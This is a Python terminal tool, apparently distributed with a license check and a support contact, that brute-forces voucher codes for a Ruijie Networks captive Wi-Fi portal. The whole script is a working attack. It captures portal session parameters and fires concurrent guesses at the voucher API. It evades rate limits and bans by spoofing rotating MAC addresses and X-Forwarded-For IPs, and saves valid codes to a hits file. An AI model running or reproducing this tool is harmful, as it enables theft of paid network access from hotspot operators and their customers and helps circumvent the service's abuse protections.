import os
import time
import random
import string
import json
import asyncio
import threading
import re
import urllib3
import requests
import aiohttp
from urllib.parse import urlparse, parse_qs, quote, unquote
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.table import Table
from rich.align import Align
from rich.console import Group

# ---------------------------------------------------------------
# Optional license
# ---------------------------------------------------------------
try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY_LIMIT = 6            # lower = safer from bans
TIMEOUT = 8
RUIJIE_BASE = "https://portal-mm-as.ruijienetworks.com"
RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"

console = Console()
tried_codes = set()
code_lock = threading.Lock()
LICENSE_INFO = {"status": "Unverified"}

# ---------------------------------------------------------------
# helpers
# ---------------------------------------------------------------
def generate_random_mac():
    return "00:16:3e:%02x:%02x:%02x" % (
        random.randint(0, 0x7f), random.randint(0, 0xff), random.randint(0, 0xff)
    )

def generate_random_ip():
    return f"192.168.110.{random.randint(2, 254)}"

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except: pass

def format_time(s):
    try:
        s = int(s)
        return f"{s//3600:02d}:{(s%3600)//60:02d}:{s%60:02d}"
    except: return "00:00:00"

def epoch_ms_to_plan(ms, flow_bytes=0):
    """Convert real expireTime (ms) to readable remaining plan."""
    try:
        ms = int(ms)
        if ms <= 0: return "N/A"
        now = int(time.time()*1000)
        remain_s = max(0, (ms - now)//1000)
        flow_gb = round(int(flow_bytes)/(1024**3), 2) if flow_bytes else 0
        tail = f" | {flow_gb}GB" if flow_gb else ""
        if remain_s > 86400 * 30:
            return f"{remain_s//86400}d{(remain_s%86400)//3600}h{tail}"
        return f"{remain_s//3600}h{(remain_s%3600)//60}m{remain_s%60}s{tail}"
    except: return "N/A"

def check_license():
    if not HAS_LICENSE_MODULE: return True, "Valid (Dev)"
    try:
        r = _license.check_approval()
        if isinstance(r, tuple): return r
        exp = getattr(_license, "get_expiry_date", lambda: "Valid")()
        return bool(r), str(exp) if exp else "Valid"
    except Exception as e: return True, str(e)

# ---------------------------------------------------------------
# Portal capture
# ---------------------------------------------------------------
def detect_and_capture():
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"})
    candidates = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://detectportal.firefox.com/success.txt",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for probe in candidates:
        try:
            r = s.get(probe, allow_redirects=True, timeout=5, verify=False)
            if "portal-mm-as" in r.url or "ruijienet" in r.text.lower():
                console.print(f"[green][+] Portal captured: {r.url[:90]}[/green]")
                return r.url
        except: continue
    return f"{RUIJIE_BASE}/?gw_id=c4b25be7d323&nasip=192.168.1.193&ssid=AboutYou5G"

def build_gw_params(portal_url):
    p = {
        "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
        "gw_address": "192.168.7.1", "gw_port": "2060",
        "ip": "192.168.110.2", "mac": "",
        "slot_num": "14", "nasip": "192.168.1.193",
        "ssid": "AboutYou5G", "ustate": "0", "mac_req": "1", "url": RUIJIE_BASE,
    }
    if not portal_url: return p
    try:
        q = parse_qs(urlparse(portal_url).query)
        for k in ("gw_id","gw_sn","gw_address","gw_port","nasip","slot_num",
                  "ssid","chap_id","chap_challenge","stage","ustate","mac_req","url"):
            if q.get(k): p[k] = q[k][0]
    except: pass
    return p

# ---------------------------------------------------------------
# REAL session fetching
# ---------------------------------------------------------------
async def fetch_real_session(session, gw_params, mac, ip):
    p = dict(gw_params)
    p["mac"] = mac
    p["ip"] = ip
    qs  = "&".join(f"{k}={quote(str(v))}" for k, v in p.items())
    url = f"{RUIJIE_WIFIDOG}?{qs}"

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
        "Client-Mac": mac,
        "X-Forwarded-For": ip,
        "Accept": "*/*",
        "Referer": f"{RUIJIE_BASE}/",
    }
    try:
        async with session.get(url, headers=headers, timeout=10,
                               allow_redirects=True, ssl=False, max_redirects=5) as r:
            if r.status == 429: return ("BAN", "429")
            final_url = str(r.url)
            body = await r.text()

            loc = r.headers.get("Location", "") or final_url
            if not loc:
                m = re.search(r'location\.href\s*=\s*[\'"]([^\'"]+)', body, re.I)
                if m: loc = m.group(1)

            if any(x in loc.lower() for x in ("request limited","error.html","errormsg","banned")):
                return ("BAN", "banned")

            js = "\n".join([loc, body, final_url])
            sid = None; sign = None; ts = None

            m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{16,})', js)
            if m: sid = m.group(1)
            m = re.search(r'sign["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{8,})', js)
            if m: sign = m.group(1)
            m = re.search(r'timestamp["\']?\s*[:=]\s*["\']?(\d{10,13})', js)
            if m: ts = m.group(1)

            qp = parse_qs(urlparse(unquote(loc)).query)
            sid = sid or qp.get("sessionId", [None])[0]
            sign = sign or qp.get("sign", [None])[0]
            ts = ts or qp.get("timestamp", [None])[0]

            if sid:
                return ("REAL", {
                    "sessionId": sid,
                    "sign": sign or "",
                    "timestamp": ts or str(int(time.time()))
                })
            return ("REAL", {
                "sessionId": "".join(random.choices(string.ascii_lowercase+string.digits, k=24)),
                "sign": "", "timestamp": str(int(time.time()))
            })
    except asyncio.TimeoutError: return ("NET", "timeout")
    except Exception as e: return ("NET", type(e).__name__)

# ---------------------------------------------------------------
# Voucher code test
# ---------------------------------------------------------------
async def test_code(session, sess, code, mac, ip):
    url = RUIJIE_VOUCHER
    if sess.get("sign") and sess.get("timestamp"):
        url += f"&sign={sess['sign']}&timestamp={sess['timestamp']}"

    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36",
        "referer": f"{RUIJIE_BASE}/download/static/maccauth/src/index.html?sessionId={sess['sessionId']}",
        "Client-Mac": mac,
        "X-Forwarded-For": ip,
    }
    payload = {"accessCode": code, "sessionId": sess["sessionId"], "apiVersion": 1}
    if sess.get("sign"):      payload["sign"] = sess["sign"]
    if sess.get("timestamp"): payload["timestamp"] = sess["timestamp"]

    try:
        async with session.post(url, json=payload, headers=headers,
                                timeout=TIMEOUT, ssl=False, allow_redirects=True) as r:
            if r.status == 429: return "__RATE_LIMITED__", "N/A"
            text = await r.text()
            if not text: return "__NETWORK_ERROR__", "N/A"
            low = text.lower()

            if "request limited" in low or "too many" in low: return "__RATE_LIMITED__", "N/A"
            if "session timed out" in low or "invalid session" in low: return "__SESSION_EXPIRED__", "N/A"

            real_plan = "N/A"
            is_hit = False
            try:
                j = json.loads(text)
                if j.get("success") is True or j.get("code") == 200 or j.get("errorCode") == 0:
                    is_hit = True
                    rd = j.get("result", {}) or j.get("data", {}) or {}
                    if isinstance(rd, dict):
                        exp = rd.get("expireTime") or rd.get("expire_time") or rd.get("expireDate")
                        flow = rd.get("flow") or rd.get("bytes") or rd.get("traffic") or 0
                        dur  = rd.get("duration") or rd.get("validity")
                        if exp:  real_plan = epoch_ms_to_plan(exp, flow)
                        elif dur: real_plan = f"{dur}s"
                if not is_hit and ('"success":true' in low or '"authresult":"1"' in low or "congratulations" in low):
                    is_hit = True
            except:
                if '"success":true' in low or "congratulations" in low: is_hit = True
            return ("HIT" if is_hit else text[:200]), real_plan
    except asyncio.TimeoutError: return "__TIMEOUT__", "N/A"
    except aiohttp.ClientError: return "__NETWORK_ERROR__", "N/A"
    except Exception as e: return f"__ERROR__:{type(e).__name__}", "N/A"

# ---------------------------------------------------------------
# Code generation
# ---------------------------------------------------------------
seq_counter = 1
seq_lock = threading.Lock()

def gen_code(mode, length, scan_method="random"):
    global seq_counter
    chars = (string.digits if mode == "num"
             else string.ascii_lowercase if mode == "eng"
             else string.ascii_lowercase + string.digits)
    try:
        if scan_method == "sequential":
            with seq_lock:
                n = seq_counter
                seq_counter += 1
            base = len(chars)
            out = []
            for _ in range(length):
                out.append(chars[n % base]); n //= base
            return "".join(reversed(out))
        return ''.join(random.choices(chars, k=length))
    except: return ""
# ---------------------------------------------------------------
# Dashboard
# ---------------------------------------------------------------
def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed,
                             status, hits, speed, cur_mac, cur_ip,
                             sess_stat, sess_id, total_target):
    layout = Table.grid(expand=True); layout.add_column()

    header = Panel(
        Text("⚡ KAVIN FAST SPEED V7 (About You) ⚡",
             style="bold bright_cyan", justify="center"),
        border_style="cyan", box=ROUNDED)

    progress = min(100.0, (tested/total_target)*100) if total_target > 0 else 0.0

    stats = Table.grid(expand=True, padding=(0, 1))
    stats.add_column(style="bold white"); stats.add_column(style="bold cyan")
    stats.add_column(style="bold white"); stats.add_column(style="bold green")

    status_style = "bold red" if "ERR" in status.upper() or "BAN" in status.upper() else "bold green"
    sess_style   = "bold green" if "REAL" in sess_stat else "bold yellow"

    stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer",  f": {elapsed}")
    stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
    stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}", style=status_style)
    stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
    stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🌐 IP",     f": ...{cur_ip[-3:]}")
    stats.add_row("  🔐 Session", f": {sess_stat}",             "  📈 Progress", f": {progress:.2f}%", style=sess_style)

    stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
    check_panel = Panel(
        Align.center(Text(f"Checking Code  :  {current_code or '------'}",
                          style="bold yellow")),
        border_style="yellow", box=ROUNDED)

    vt = Table(show_header=True, header_style="bold bright_white", expand=True,
               box=ROUNDED, border_style="green")
    vt.add_column("Voucher Hits", style="bold green", justify="center")
    vt.add_column("Real Plan (သက်တမ်း)", style="bold green", justify="center")
    for h in hits: vt.add_row(h.get('code',''), h.get('plan','N/A'))
    if not hits: vt.add_row("No hits found yet...", "N/A")

    footer = Panel(Align.center(Text(
        "✨ Developed for KAVIN FAST SPEED • Real Session Active ✨",
        style="bold bright_yellow")), border_style="red", box=ROUNDED)

    return Panel(Group(header, stats_panel, check_panel, vt, footer),
                 border_style="bright_blue")


# ---------------------------------------------------------------
# Scan loop
# ---------------------------------------------------------------
async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
    global seq_counter, tried_codes
    tried_codes = set()
    seq_counter = 1

    if not gw_params:
        gw_params = build_gw_params(None)

    mode_str   = f"{mode}_{length}"
    hits       = []
    tested     = 0
    start_time = time.time()

    current_code   = [""]
    current_status = ["Starting"]
    sess_stat      = ["INITIALIZING"]
    sess_id        = ["--------"]
    current_mac    = [generate_random_mac()]
    current_ip     = [generate_random_ip()]
    sess_data      = [None]

    semaphore    = asyncio.Semaphore(CONCURRENCY_LIMIT)
    total_target = (10**length if mode == "num"
                    else 26**length if mode == "eng"
                    else 36**length)

    conn = aiohttp.TCPConnector(limit=50, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=conn) as session:

        live = Live(
            get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00",
                                     "Running", hits, 0.0, current_mac[0],
                                     current_ip[0], sess_stat[0], sess_id[0],
                                     total_target),
            refresh_per_second=6, screen=True)

        def render():
            el = time.time() - start_time
            spd = (tested/el*60) if el > 0 else 0.0
            live.update(get_dashboard_renderable(
                mode_str, scan_method, current_code[0], tested,
                format_time(el), current_status[0], hits, spd,
                current_mac[0], current_ip[0], sess_stat[0],
                sess_id[0], total_target))

        with live:
            try:
                while True:
                    if sess_data[0] is None:
                        current_status[0] = "Fetching Session"
                        render()
                        st, res = await fetch_real_session(
                            session, gw_params, current_mac[0], current_ip[0])

                        if st == "BAN":
                            current_mac[0] = generate_random_mac()
                            current_ip[0]  = generate_random_ip()
                            sess_stat[0]   = "BANNED (Rotating)"
                            current_status[0] = "Banned"
                            render()
                            await asyncio.sleep(2.5)
                            continue

                        if st != "REAL":
                            sess_stat[0]   = "SESS_ERR"
                            current_status[0] = "Retrying"
                            render()
                            await asyncio.sleep(2)
                            continue

                        sess_data[0]   = res
                        sess_id[0]     = res['sessionId']
                        sess_stat[0]   = f"REAL ({res['sessionId'][:8]}...)"
                        current_status[0] = "Running"
                        render()

                    batch = []
                    guard = 0
                    while len(batch) < CONCURRENCY_LIMIT and guard < 500:
                        guard += 1
                        c = gen_code(mode, length, scan_method)
                        if not c: continue
                        with code_lock:
                            if c in tried_codes: continue
                            tried_codes.add(c)
                        batch.append(c)

                    if not batch:
                        await asyncio.sleep(0.05)
                        continue

                    async def bounded(code):
                        async with semaphore:
                            return await test_code(session, sess_data[0],
                                                   code, current_mac[0],
                                                   current_ip[0])

                    results = await asyncio.gather(
                        *[bounded(c) for c in batch],
                        return_exceptions=True)

                    reset_session = False
                    hit_break = False

                    for idx, res_tuple in enumerate(results):
                        tested += 1
                        code = batch[idx]
                        current_code[0] = code

                        if isinstance(res_tuple, Exception):
                            render(); continue

                        res, plan = res_tuple

                        if res == "__SESSION_EXPIRED__":
                            sess_data[0]     = None
                            sess_stat[0]     = "EXPIRED"
                            current_status[0] = "Refreshing"
                            reset_session = True
                            break

                        if res == "__RATE_LIMITED__":
                            sess_data[0]   = None
                            current_mac[0] = generate_random_mac()
                            current_ip[0]  = generate_random_ip()
                            sess_stat[0]   = "BANNED"
                            current_status[0] = "Rate-Limited"
                            reset_session = True
                            break

                        if res == "HIT":
                            now_str = time.strftime("%H:%M:%S")
                            hits.append({"code": code, "time": now_str, "plan": plan})
                            try:
                                with open(HITS_FILE, "a", encoding="utf-8") as f:
                                    f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
                            except: pass

                            sess_data[0]   = None
                            current_mac[0] = generate_random_mac()
                            current_ip[0]  = generate_random_ip()
                            sess_stat[0]   = "HIT (Saved)"
                            current_status[0] = "HIT!"
                            reset_session = True
                            hit_break = True
                            break

                        render()

                    render()

                    if reset_session:
                        await asyncio.sleep(1.2 if hit_break else 1.8)

            except (KeyboardInterrupt, asyncio.CancelledError):
                try: live.stop()
                except: pass
                console.print("\n[bold yellow]⏹ Interrupted by user[/bold yellow]")
            except Exception as e:
                try: live.stop()
                except: pass
                console.print(f"\n[bold red]Fatal Error: {e}[/bold red]")


# ---------------------------------------------------------------
# Menus
# ---------------------------------------------------------------
def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"),
                  justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED V7 (About You) ⚡",
                       style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"),
                  justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        ch = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if ch == "0": return None
        if ch in ("1","2","3"):
            return {"1":"num","2":"eng","3":"mix"}[ch]

def ask_length(mode):
    while True:
        show_banner()
        console.print("  [bold bright_white]Choose Voucher Length (6, 7, 8, 9):[/bold bright_white]\n")
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] ⚡ 6 Characters")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] ⚡ 7 Characters")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] ⚡ 8 Characters")
        console.print("  [bold bright_cyan]4.[/bold bright_cyan] ⚡ 9 Characters")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        ch = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if ch == "0": return None
        if ch in ("1","2","3","4"):
            return (6,7,8,9)[int(ch)-1]

def ask_scan_method():
    while True:
        show_banner()
        console.print("  [bold bright_white]Choose Search Scan Method:[/bold bright_white]\n")
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode (ကျပန်း)")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode (အစဉ်လိုက်)")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        ch = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if ch == "0": return None
        if ch in ("1","2"):
            return {"1":"random","2":"sequential"}[ch]

# ---------------------------------------------------------------
# Entry
# ---------------------------------------------------------------
def run():
    global LICENSE_INFO
    show_banner()

    ok, msg = check_license()
    LICENSE_INFO["status"] = msg

    portal_url = detect_and_capture()
    gw_params  = build_gw_params(portal_url)

    while True:
        mode = ask_mode()
        if mode is None: return
        length = ask_length(mode)
        if length is None: continue
        method = ask_scan_method()
        if method is None: continue

        try:
            asyncio.run(scan_loop_async(mode, length, scan_method=method,
                                        gw_params=gw_params))
        except KeyboardInterrupt: pass
        except Exception as e:
            console.print(f"[bold red]Error: {e}[/bold red]")
            time.sleep(2)
        break

def main():
    try: run()
    except (KeyboardInterrupt, EOFError):
        console.print("\n\n[bold red]Exiting...[/bold red]\n")
    except Exception as e:
        console.print(f"[bold red]Fatal Error: {e}[/bold red]")
    finally:
        try: clear_screen()
        except: pass
        try:
            console.print("\n\n")
            console.print(Text("✨ Thank You • Contact @kavin799 for Support 🙏",
                               style="bold bright_green"), justify="center")
            console.print("\n\n")
            time.sleep(1)
        except: pass

if __name__ == "__main__":
    main()
